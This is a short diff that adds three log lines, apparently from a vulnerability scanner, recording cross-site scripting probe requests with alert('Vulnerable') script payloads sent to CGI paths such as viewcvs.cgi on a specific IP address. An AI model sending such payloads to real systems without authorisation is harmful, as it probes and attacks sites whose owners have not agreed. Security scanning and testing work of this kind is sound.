@@ -1,0 +1,3 @@
+Attempts: 1 - Request URL: 173.192.79.221/cgi-bin/vq/demos/respond.pl?<script>alert(\'Vulnerable\')</script>
+Attempts: 2 - Request URL: 173.192.79.221/cgi-bin/viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\\\"><script>alert(\'Vulnerable\')</script>;
+Attempts: 3 - Request URL: 173.192.79.221/cgi-bin/viewcvs.cgi/viewcvs/?cvsroot=<script>alert(\'Vulnerable\')</script>
